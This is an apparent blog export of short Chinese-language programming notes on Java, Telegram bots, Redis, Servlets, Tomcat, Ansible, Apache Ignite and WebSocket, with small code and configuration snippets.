    <content><![CDATA[<h3 id="關於Java繼承用法"><a href="#關於Java繼承用法" class="headerlink" title="關於Java繼承用法"></a>關於Java繼承用法</h3><span id="more"></span>
<p>這篇文章是介紹Java的繼承該如何實作~<br>當原類別擴充到一定程度時，一般會將共用的部分抽出來當父類別。<br>當有特殊功能要加在原類別上時，就會實作新的子類別並繼承父類別。</p>
<h3 id="父類別"><a href="#父類別" class="headerlink" title="父類別"></a>父類別</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public class father &#123;</span><br><span class="line"></span><br><span class="line">	private int money = 1000000;</span><br><span class="line">	</span><br><span class="line">	private int houses = 1;</span><br><span class="line">	</span><br><span class="line">	private int cars = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="子類別繼承父類別"><a href="#子類別繼承父類別" class="headerlink" title="子類別繼承父類別"></a>子類別繼承父類別</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public class son extends father &#123;</span><br><span class="line"></span><br><span class="line">	private int money = 500000;</span><br><span class="line">	</span><br><span class="line">	private int houses = 2;</span><br><span class="line">	</span><br><span class="line">	private int cars = 2;</span><br><span class="line">	</span><br><span class="line">	private int bikes = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>extends</tag>
      </tags>
  </entry>
  <entry>
    <title>關於Telegram LongPolling Versus  Webhook</title>
    <url>/posts/2981f4e6/</url>
    <content><![CDATA[<h3 id="關於Telegram-LongPolling-Versus-Webhook"><a href="#關於Telegram-LongPolling-Versus-Webhook" class="headerlink" title="關於Telegram LongPolling Versus  Webhook"></a>關於Telegram LongPolling Versus  Webhook</h3><span id="more"></span>
<p>在Telegram取得使用者訊息官方提供兩種方法。<br>1.LongPolling - getUpdates<br>2.Webhook</p>
<h3 id="LongPolling-getUpdates"><a href="#LongPolling-getUpdates" class="headerlink" title="LongPolling - getUpdates"></a>LongPolling - getUpdates</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Long Polling 是指程式間隔一定時間透過 getUpdates（上面所使用的方法）取得訊息，</span><br><span class="line">缺點是浪費資源、不夠即時，所以適合在程式還沒有 deploy，在 develop 和 <span class="built_in">test</span> 階段時使用。</span><br></pre></td></tr></table></figure>

<h3 id="Webhook"><a href="#Webhook" class="headerlink" title="Webhook"></a>Webhook</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Webhook 是指向 Telegram 設定一組 callback url，只要當使用者傳送訊息給 Chatbot，</span><br><span class="line">Telegram 就會把message連同 metada 透過 url 傳給 web server。適合在程式已經 deploy，有固定 url 的 production 環境使用。</span><br></pre></td></tr></table></figure>

<h3 id="Message-with-text-using-curl"><a href="#Message-with-text-using-curl" class="headerlink" title="Message with text using curl:"></a>Message with text using curl:</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl --tlsv1.2 -v -k -X POST -H <span class="string">&quot;Content-Type: application/json&quot;</span> -H <span class="string">&quot;Cache-Control: no-cache&quot;</span>  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">&quot;update_id&quot;:10000,</span></span><br><span class="line"><span class="string">&quot;message&quot;:&#123;</span></span><br><span class="line"><span class="string">  &quot;date&quot;:1441645532,</span></span><br><span class="line"><span class="string">  &quot;chat&quot;:&#123;</span></span><br><span class="line"><span class="string">     &quot;last_name&quot;:&quot;Test Lastname&quot;,</span></span><br><span class="line"><span class="string">     &quot;id&quot;:1111111,</span></span><br><span class="line"><span class="string">     &quot;first_name&quot;:&quot;Test&quot;,</span></span><br><span class="line"><span class="string">     &quot;username&quot;:&quot;Test&quot;</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">  &quot;message_id&quot;:1365,</span></span><br><span class="line"><span class="string">  &quot;from&quot;:&#123;</span></span><br><span class="line"><span class="string">     &quot;last_name&quot;:&quot;Test Lastname&quot;,</span></span><br><span class="line"><span class="string">     &quot;id&quot;:1111111,</span></span><br><span class="line"><span class="string">     &quot;first_name&quot;:&quot;Test&quot;,</span></span><br><span class="line"><span class="string">     &quot;username&quot;:&quot;Test&quot;</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">  &quot;text&quot;:&quot;/start&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> <span class="string">&quot;https://YOUR.BOT.URL:YOURPORT/&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Telegram</category>
      </categories>
      <tags>
        <tag>API</tag>
      </tags>
  </entry>
  <entry>
    <title>關於Redis-publish/subscribe</title>
    <url>/posts/5c5b8495/</url>
    <content><![CDATA[<h3 id="關於Redis-publish-x2F-subscribe"><a href="#關於Redis-publish-x2F-subscribe" class="headerlink" title="關於Redis-publish&#x2F;subscribe"></a>關於Redis-publish&#x2F;subscribe</h3><span id="more"></span>
<p>這篇介紹Redis-publish&#x2F;subscribe。</p>
<h3 id="AppInit做subscribe"><a href="#AppInit做subscribe" class="headerlink" title="AppInit做subscribe"></a>AppInit做subscribe</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RedisSubscriberType.VALUES.stream().forEach(x -&gt; &#123;</span><br><span class="line">	<span class="keyword">if</span> (x.subscribe()) &#123;</span><br><span class="line">		LogUtils.system.info(<span class="string">&quot;init RedisSubscriberType &quot;</span> + x.name());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="使用publish更新資料"><a href="#使用publish更新資料" class="headerlink" title="使用publish更新資料"></a>使用publish更新資料</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RedisSubscriberType.DataSync.publish(JSONUtils.toJsonString(updateData.get()));</span><br></pre></td></tr></table></figure>

<h3 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RedisManager.get().getTopic(channel).publish(data);</span><br></pre></td></tr></table></figure>

<h3 id="subscribe"><a href="#subscribe" class="headerlink" title="subscribe"></a>subscribe</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RedisManager.get().getTopic(channel).addListener(String.class, (channel, message) -&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Publish/Subscribe</tag>
      </tags>
  </entry>
  <entry>
    <title>關於Servlet頁面跳轉</title>
    <url>/posts/2034b039/</url>
    <content><![CDATA[<h3 id="關於Servlet頁面跳轉"><a href="#關於Servlet頁面跳轉" class="headerlink" title="關於Servlet頁面跳轉"></a>關於Servlet頁面跳轉</h3><span id="more"></span>
<p>這篇介紹在Servlet中頁面跳轉的兩種方法。<br>1.forward(request, response);<br>2.sendRedirect();</p>
<h3 id="forward-request-response"><a href="#forward-request-response" class="headerlink" title="forward(request, response);"></a>forward(request, response);</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.Server Side呼叫</span><br><span class="line">2.定義在RequestDispatcher介面，由request.getRequestDispatcher().forward(request, response);呼叫</span><br><span class="line">3.屬於內部轉址，URL不會顯示另一支jsp名稱</span><br><span class="line">4.因為是內部轉址，可以透過setAttribute設定傳遞參數</span><br><span class="line">5.效率較高</span><br><span class="line">6.適用於權限管理轉頁時使用</span><br></pre></td></tr></table></figure>

<h3 id="sendRedirect"><a href="#sendRedirect" class="headerlink" title="sendRedirect();"></a>sendRedirect();</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.Server Side呼叫</span><br><span class="line">2.定義在HttpServletResponse，由response.sendRedirect();呼叫</span><br><span class="line">3.直接外部呼叫另一支jsp，URL會顯示另一支jsp名稱</span><br><span class="line">4.效率較低(因為cilent會在request一次)</span><br><span class="line">5.適用於跳至外部網站或回主畫面使用</span><br></pre></td></tr></table></figure>

<h3 id="forward-Example"><a href="#forward-Example" class="headerlink" title="forward Example"></a>forward Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">request.getRequestDispatcher(<span class="string">&quot;Index.jsp&quot;</span>).forward(request, response);</span><br></pre></td></tr></table></figure>

<h3 id="sendRedirect-Example"><a href="#sendRedirect-Example" class="headerlink" title="sendRedirect Example"></a>sendRedirect Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">response.sendRedirect(<span class="string">&quot;Index.jsp&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="傳遞參數方法"><a href="#傳遞參數方法" class="headerlink" title="傳遞參數方法"></a>傳遞參數方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">塞值</span><br><span class="line">request.setAttribute(<span class="string">&quot;test&quot;</span>, name);</span><br><span class="line">取值</span><br><span class="line">request.getAttribute(<span class="string">&quot;test&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="sendRedirect-不能使用傳遞參數"><a href="#sendRedirect-不能使用傳遞參數" class="headerlink" title="sendRedirect 不能使用傳遞參數"></a>sendRedirect 不能使用傳遞參數</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">因為sendRedirect間接產生一個新的request，</span><br><span class="line">所以舊的request setAttribute的參數會抓不到。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Servlet</category>
      </categories>
      <tags>
        <tag>forward</tag>
        <tag>Redirect</tag>
      </tags>
  </entry>
  <entry>
    <title>關於TelegramBot收到相關ErrorResponse</title>
    <url>/posts/936e538b/</url>
    <content><![CDATA[<h3 id="關於TelegramBot收到相關ErrorResponse"><a href="#關於TelegramBot收到相關ErrorResponse" class="headerlink" title="關於TelegramBot收到相關ErrorResponse"></a>關於TelegramBot收到相關ErrorResponse</h3><span id="more"></span>

<h3 id="400"><a href="#400" class="headerlink" title="400"></a>400</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Response:&#123;<span class="string">&quot;ok&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;error_code&quot;</span>:400,<span class="string">&quot;description&quot;</span>:<span class="string">&quot;Bad Request: message is too long&quot;</span>&#125;</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">Soultion:依照Telegram API文件，一則訊息的上限是4096bytes</span><br></pre></td></tr></table></figure>

<h3 id="429"><a href="#429" class="headerlink" title="429"></a>429</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Response:&#123;<span class="string">&quot;ok&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;error_code&quot;</span>:429,<span class="string">&quot;description&quot;</span>:<span class="string">&quot;Too Many Requests: retry after 899&quot;</span>,<span class="string">&quot;parameters&quot;</span>:&#123;<span class="string">&quot;retry_after&quot;</span>:899&#125;&#125;</span><br><span class="line"></span><br><span class="line">Soultion:</span><br><span class="line">1.When sending messages inside a particular chat, avoid sending more than one message per second.</span><br><span class="line">2.The API will not allow more than 30 messages per second or so.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Telegram</category>
      </categories>
      <tags>
        <tag>ErrorResponse</tag>
      </tags>
  </entry>
  <entry>
    <title>關於TelegramSupergroups</title>
    <url>/posts/78692a85/</url>
    <content><![CDATA[<h3 id="關於TelegramSupergroups"><a href="#關於TelegramSupergroups" class="headerlink" title="關於TelegramSupergroups"></a>關於TelegramSupergroups</h3><span id="more"></span>
<p>通常在Telegram建立新群組時，會是一般群組。<br>這邊介紹如何成升級supergroups。</p>
<h3 id="升級supergroups"><a href="#升級supergroups" class="headerlink" title="升級supergroups"></a>升級supergroups</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.先建立Group</span><br><span class="line">2.加入一位好友</span><br><span class="line">3.將好友設為Admin，並且將權限全開。</span><br><span class="line">4.已升級成supergroups，可以用https://api.telegram.org/bot&#123;botToken&#125;/getUpdates來確認chat_id。</span><br><span class="line">5.chat_id若是-100開頭就是supergroups。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Telegram</category>
      </categories>
      <tags>
        <tag>supergroups</tag>
      </tags>
  </entry>
  <entry>
    <title>關於TelegramBot的token</title>
    <url>/posts/6bb834f/</url>
    <content><![CDATA[<h3 id="關於TelegramBot的token"><a href="#關於TelegramBot的token" class="headerlink" title="關於TelegramBot的token"></a>關於TelegramBot的token</h3><span id="more"></span>

<h3 id="查詢自己所建立TelegramBot的token"><a href="#查詢自己所建立TelegramBot的token" class="headerlink" title="查詢自己所建立TelegramBot的token"></a>查詢自己所建立TelegramBot的token</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.先找到@BotFather</span><br><span class="line">2.在視窗內下/mybots指令</span><br><span class="line">3.Choose a bot from the list below:</span><br><span class="line">  這邊會顯示你自己建立過的bot</span><br><span class="line">4.點選欲想查詢的@Bot</span><br><span class="line">5.點API Token</span><br><span class="line">6.顯示Token</span><br></pre></td></tr></table></figure>

<h3 id="利用token查詢chat-id"><a href="#利用token查詢chat-id" class="headerlink" title="利用token查詢chat_id"></a>利用token查詢chat_id</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在瀏覽器上key https://api.telegram.org/bot&#123;token&#125;/getUpdates</span><br></pre></td></tr></table></figure>

<h3 id="TelegramBot訊息的限制"><a href="#TelegramBot訊息的限制" class="headerlink" title="TelegramBot訊息的限制"></a>TelegramBot訊息的限制</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">傳10則訊息，必須等40秒後才能再傳</span><br><span class="line">在倒數期間傳的訊息都會Miss掉</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Telegram</category>
      </categories>
      <tags>
        <tag>token</tag>
      </tags>
  </entry>
  <entry>
    <title>關於Redis的Key</title>
    <url>/posts/e0e46c62/</url>
    <content><![CDATA[<h3 id="關於Redis的Key"><a href="#關於Redis的Key" class="headerlink" title="關於Redis的Key"></a>關於Redis的Key</h3><span id="more"></span>
<p>在使用Redis時，建立一個好的Key是相當重要的。<br>以下先介紹官網對Key的一些描述和建議。</p>
<h3 id="Redis官網對Key的描述和建議"><a href="#Redis官網對Key的描述和建議" class="headerlink" title="Redis官網對Key的描述和建議"></a>Redis官網對Key的描述和建議</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.不推薦使用非常長的Key:超過1024bytes效能會變差</span><br><span class="line">2.使用原本Key的Hash值也是好方法</span><br><span class="line">3.Key最好有可讀性，讓key設計不重覆 example: u200taiwan -&gt; userid:200:taiwan</span><br><span class="line">4.嘗試固定格式: :(分隔) ， . 或 - (用於多個組合字元) exmaple: userid:200:taiwan:father-man</span><br><span class="line">5.Key最大512MB</span><br></pre></td></tr></table></figure>

<h3 id="key命名設計"><a href="#key命名設計" class="headerlink" title="key命名設計"></a>key命名設計</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(1)可讀性和可管理性，以業務名(或資料庫名)為前綴(防止key衝突)，用冒號分隔，比如業務名:表名:<span class="built_in">id</span></span><br><span class="line">(2)簡潔性，在保證語義的前提下，控制key的長度，當key較多時，記憶體的使用率要注意</span><br><span class="line">(3)不要包含特殊字符，example：包含空格、換行、單雙引號以及其他特殊符號</span><br></pre></td></tr></table></figure>

<h3 id="value設計"><a href="#value設計" class="headerlink" title="value設計"></a>value設計</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(1)拒絕bigkey，string類型控制在10KB以內，<span class="built_in">hash</span>、list、<span class="built_in">set</span>、zset元素個數不要超過5000。</span><br><span class="line">example:一個包含200萬個元素的list。非字串的bigkey，不要使用del刪除，</span><br><span class="line">使用hscan、sscan、zscan方式漸進式刪除，同時要注意防止bigkey過期時間自動刪除問題。</span><br><span class="line">(2)選擇適合的資料結構</span><br><span class="line">example:hmset user:1 name tom age 19 favor football</span><br><span class="line">(3)控制key的生命周期，redis不是垃圾桶。 </span><br><span class="line">建議使用expire設置過期時間</span><br></pre></td></tr></table></figure>

<h3 id="命令使用"><a href="#命令使用" class="headerlink" title="命令使用"></a>命令使用</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.O(N)關注N的數量，example:hgetall、lrange、smembers、zrange、sinter等並非不能使用，但是需要明確N的值。有iterator的需求可以使用hscan、sscan、zscan代替。</span><br><span class="line">2.禁用命令:禁止線上使用keys、flushall、flushdb等，通過redis的rename機制禁掉命令，或者使用scan的方式處理。</span><br><span class="line">3.使用批量操作提高效率</span><br><span class="line">原生命令:例如mget、mset。非原生命令：可以使用pipeline提高效率。要注意控制一次批量操作的元素個數(example:500以內，實際也和元素字節數有關)。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Key</tag>
      </tags>
  </entry>
  <entry>
    <title>關於Tomcat的server.xml三個port設定</title>
    <url>/posts/be9658f2/</url>
    <content><![CDATA[<h3 id="關於Tomcat的server-xml三個port設定"><a href="#關於Tomcat的server-xml三個port設定" class="headerlink" title="關於Tomcat的server.xml三個port設定"></a>關於Tomcat的server.xml三個port設定</h3><span id="more"></span>
<p>以Tomcat8.0為例，在安装目錄下.conf&#x2F;server.xml 中可以配置三個port號<br>如果需要使用多個Tomcat，需要配置以下三個port。</p>
<h3 id="Tomcat的關閉port，預設為8005。"><a href="#Tomcat的關閉port，預設為8005。" class="headerlink" title="Tomcat的關閉port，預設為8005。"></a>Tomcat的關閉port，預設為8005。</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;Server port=<span class="string">&quot;8005&quot;</span> shutdown=<span class="string">&quot;SHUTDOWN&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Tomcat的http-Connector-port，預設為8080。"><a href="#Tomcat的http-Connector-port，預設為8080。" class="headerlink" title="Tomcat的http Connector port，預設為8080。"></a>Tomcat的http Connector port，預設為8080。</h3><p>protocol: http協定<br>connectionTimeout: 連線timeout時間<br>redirectPort: 如果發送的是https request，就會將request轉發到8443 port。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;Connector port=<span class="string">&quot;8080&quot;</span> protocol=<span class="string">&quot;HTTP/1.1&quot;</span> connectionTimeout=<span class="string">&quot;20000&quot;</span> redirectPort=<span class="string">&quot;8443&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Tomcat的AJP-x2F-1-3-Connectorport，預設為8009。"><a href="#Tomcat的AJP-x2F-1-3-Connectorport，預設為8009。" class="headerlink" title="Tomcat的AJP&#x2F;1.3 Connectorport，預設為8009。"></a>Tomcat的AJP&#x2F;1.3 Connectorport，預設為8009。</h3><p>AJP&#x2F;1.3協定負責和其它HTTP Server建立連線，由8009 port監聽，例如內建Tomcat和Apache或IIS需要用到這個設定。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;Connector port=<span class="string">&quot;8009&quot;</span> protocol=<span class="string">&quot;AJP/1.3&quot;</span> redirectPort=<span class="string">&quot;8443&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>server.xml</tag>
      </tags>
  </entry>
  <entry>
    <title>關於Thread.Sleep(0);</title>
    <url>/posts/3c6ebf72/</url>
    <content><![CDATA[<h3 id="關於Thread-Sleep-0"><a href="#關於Thread-Sleep-0" class="headerlink" title="關於Thread.Sleep(0);"></a>關於Thread.Sleep(0);</h3><span id="more"></span>
<p>Thread.Sleep(0)的作用，就是”觸發操作系統立刻重新進行一次CPU競爭”。</p>
<p>競爭的結果也許是當前Thread仍然獲得CPU控制權，也許會換成別的Thread獲得CPU控制權。</p>
<p>所以在Loading大的系統中，可能丟失執行權到CPU下次有空，造成非預期的系統錯誤。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">private long delayMilliSeconds = 0;</span><br><span class="line">//直接執行Thread.Sleep(0);有可能會發生非預期的錯誤，這邊要多加一層判斷，當delayMilliSeconds &gt; 0</span><br><span class="line">//才能執行Thread.Sleep(delayMilliSeconds);方法。</span><br><span class="line"><span class="keyword">if</span> (delayMilliSeconds &gt; 0) &#123;</span><br><span class="line">	try &#123;</span><br><span class="line">		TimeUnit.MILLISECONDS.<span class="built_in">sleep</span>(delayMilliSeconds);</span><br><span class="line">	&#125; catch (InterruptedException e) &#123;</span><br><span class="line">		LogUtils.error.error(e.getMessage(), e);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>Thread.sleep(0);</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>關於 UnChecked IOException</title>
    <url>/posts/eca03f6f/</url>
    <content><![CDATA[<h3 id="關於UnCheckedIOException"><a href="#關於UnCheckedIOException" class="headerlink" title="關於UnCheckedIOException"></a>關於UnCheckedIOException</h3><span id="more"></span>
<p>從Java文件來看UnCheckedIOException的架構如下:<br>Class UncheckedIOException<br>java.lang.Object<br>    java.lang.Throwable<br>        java.lang.Exception<br>            java.lang.RuntimeException<br>                java.io.UncheckedIOException<br>All Implemented Interfaces:<br>Serializable</p>
<p>目前遇到的情境是當使用stream或將Json String To Class時<br>使用IOException會Catch不到，因為這些功能屬於RuntimeException。</p>
<h3 id="Example-IOException"><a href="#Example-IOException" class="headerlink" title="Example:IOException"></a>Example:IOException</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">@Deprecated</span><br><span class="line">public static &lt;T&gt; List&lt;T&gt; parseJsonToMapList(String jsonInput) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">	try &#123;</span><br><span class="line">		<span class="built_in">return</span> JSONUtils.readValue(jsonInput,</span><br><span class="line">			TypeFactory.defaultInstance().constructCollectionType(ArrayList.class, Map.class));</span><br><span class="line">	&#125; catch (IOException e) &#123;</span><br><span class="line">		LogUtils.parseError.error(<span class="string">&quot;jsonInput: &quot;</span> + jsonInput, e);</span><br><span class="line">		throw e;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Example-UncheckedIOException"><a href="#Example-UncheckedIOException" class="headerlink" title="Example:UncheckedIOException"></a>Example:UncheckedIOException</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static &lt;T&gt; List&lt;T&gt; parseJsonToMapInstanceList(String jsonInput) &#123;</span><br><span class="line">	try &#123;</span><br><span class="line">		<span class="built_in">return</span> JSONUtils.readValue(jsonInput,</span><br><span class="line">			TypeFactory.defaultInstance().constructCollectionType(ArrayList.class, Map.class));</span><br><span class="line">	&#125; catch (IOException e) &#123;</span><br><span class="line">		LogUtils.parseError.error(<span class="string">&quot;jsonInput: &quot;</span> + jsonInput, e);</span><br><span class="line">		throw new UncheckedIOException(e);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Exception</tag>
      </tags>
  </entry>
  <entry>
    <title>關於ansible.cfg</title>
    <url>/posts/db3da144/</url>
    <content><![CDATA[<h3 id="什麼是ansible-cfg"><a href="#什麼是ansible-cfg" class="headerlink" title="什麼是ansible.cfg?"></a>什麼是ansible.cfg?</h3><span id="more"></span>
<p>在 Ansible 中，我們可以透過配置 Ansible 的組態檔案 - ansible.cfg，來指定 Ansible 要去哪裡查找 role 的路徑。</p>
<h3 id="在workspace下新增ansible-cfg，並加入以下內容"><a href="#在workspace下新增ansible-cfg，並加入以下內容" class="headerlink" title="在workspace下新增ansible.cfg，並加入以下內容"></a>在workspace下新增ansible.cfg，並加入以下內容</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">roles_path = /path/to/roles</span><br><span class="line"></span><br><span class="line">若有多個路徑要設定:</span><br><span class="line">[defaults]</span><br><span class="line">roles_path = /path/to/public_roles:/path/to/private_roles</span><br></pre></td></tr></table></figure>

<h3 id="其它參數設定"><a href="#其它參數設定" class="headerlink" title="其它參數設定"></a>其它參數設定</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">private_key_file = /path/to/private_key</span><br><span class="line">inventory = /path/to/inventory</span><br><span class="line">roles_path = /path/to/roles</span><br></pre></td></tr></table></figure>

<h3 id="上述範例檔案配置"><a href="#上述範例檔案配置" class="headerlink" title="上述範例檔案配置"></a>上述範例檔案配置</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">workspace</span><br><span class="line">├── Vagrantfile</span><br><span class="line">├── ansible.cfg</span><br><span class="line">├── inventory</span><br><span class="line">├── playbook.yml</span><br><span class="line">└── roles</span><br><span class="line">    └── pip</span><br><span class="line">        └── tasks</span><br><span class="line">            └── main.yml</span><br></pre></td></tr></table></figure>

<h3 id="官方其它不同檔案配置"><a href="#官方其它不同檔案配置" class="headerlink" title="官方其它不同檔案配置"></a>官方其它不同檔案配置</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.設置環境變量 (ANSIBLE_CONFIG)</span><br><span class="line">2.置於當前目錄下的 ansible.cfg（這次範例中使用的方法）</span><br><span class="line">3.置於根目錄下的 .ansible.cfg</span><br><span class="line">4.置於 /etc/ansible/ 下的 ansible.cfg</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Ansible</category>
      </categories>
      <tags>
        <tag>Ansible</tag>
      </tags>
  </entry>
  <entry>
    <title>關於ignite Server</title>
    <url>/posts/5c91a741/</url>
    <content><![CDATA[<h3 id="關於ignite-Server"><a href="#關於ignite-Server" class="headerlink" title="關於ignite Server"></a>關於ignite Server</h3><span id="more"></span>
<p>安裝路徑:&#x2F;usr&#x2F;local&#x2F;apache-ignite-2.7.0-bin<br>log路徑:&#x2F;usr&#x2F;local&#x2F;apache-ignite-2.7.0-bin&#x2F;work&#x2F;log</p>
<h3 id="執行與關閉指令"><a href="#執行與關閉指令" class="headerlink" title="執行與關閉指令"></a>執行與關閉指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">start:</span><br><span class="line">/usr/local/apache-ignite-2.7.0-bin/bin/startIgnite.sh</span><br><span class="line">shutdown:</span><br><span class="line">/usr/local/apache-ignite-2.7.0-bin/bin/shutdownIgnite.sh</span><br></pre></td></tr></table></figure>

<h3 id="重啟順序"><a href="#重啟順序" class="headerlink" title="重啟順序"></a>重啟順序</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1. All Tomcat server shutdown</span><br><span class="line">2. All Ignite server shutdown (到此步驟請檢查 java process 是否已全部關閉)</span><br><span class="line">3. All Ignite server startup</span><br><span class="line">4. All Tomcat server startup</span><br></pre></td></tr></table></figure>

<h3 id="Ignite-Visor"><a href="#Ignite-Visor" class="headerlink" title="Ignite Visor"></a>Ignite Visor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Visor 為 Ignite 提供了腳本化的監控能力，它可以用於獲得與節點、緩存和任務有關的統計數據，</span><br><span class="line">顯示與拓撲有關的各種指標的一般細節，還有節點的配置屬性也可以在這裡看到，它還可以用於</span><br><span class="line">啟動和停止遠程節點。</span><br><span class="line">執行路徑: /usr/local/apache-ignite-2.7.0-bin/bin/ignitevisorcmd.sh</span><br><span class="line">選擇 ignite config 路徑:</span><br><span class="line">1. 輸入 open</span><br><span class="line">2. 選擇 config (這裡選擇 ignite startup 指定的 config)</span><br><span class="line"></span><br><span class="line">查看 cluster 狀態</span><br><span class="line">visor&gt; top</span><br><span class="line"></span><br><span class="line">查看 cache size / heap 使用率</span><br><span class="line">visor&gt; cache -a</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ignite</category>
      </categories>
      <tags>
        <tag>ignite</tag>
      </tags>
  </entry>
  <entry>
    <title>簡介WebSocket</title>
    <url>/posts/ae0a85b0/</url>
    <content><![CDATA[<h3 id="簡介WebSocket"><a href="#簡介WebSocket" class="headerlink" title="簡介WebSocket"></a>簡介WebSocket</h3><span id="more"></span>
<p>WebSocket是一種網路傳輸協定，可在單個TCP連接上進行雙向溝通。</p>
<h3 id="有HTTP為什麼還需要WebSocket"><a href="#有HTTP為什麼還需要WebSocket" class="headerlink" title="有HTTP為什麼還需要WebSocket?"></a>有HTTP為什麼還需要WebSocket?</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">HTTP Protocol 有個缺點，request只能由client發起。</span><br><span class="line">舉例來說，今天想要查某支股票的資訊，在HTTP的世界中，只能用瀏覽器(client)向Server請求某支股票的資訊。</span><br><span class="line">HTTP無法做到由Server主動推送訊息給client。</span><br><span class="line"></span><br><span class="line">這種單向請求的特性，若Server端有連續的狀態變化，client要知道訊息就非常繁瑣，只能用pooling的方式</span><br><span class="line">每隔一段時間就發出request來確認server有沒有新的資料。</span><br><span class="line"></span><br><span class="line">pooling的效率低，耗資源，造就工程師思考出更好的方法。WebSocket就是這樣被發明的。</span><br></pre></td></tr></table></figure>

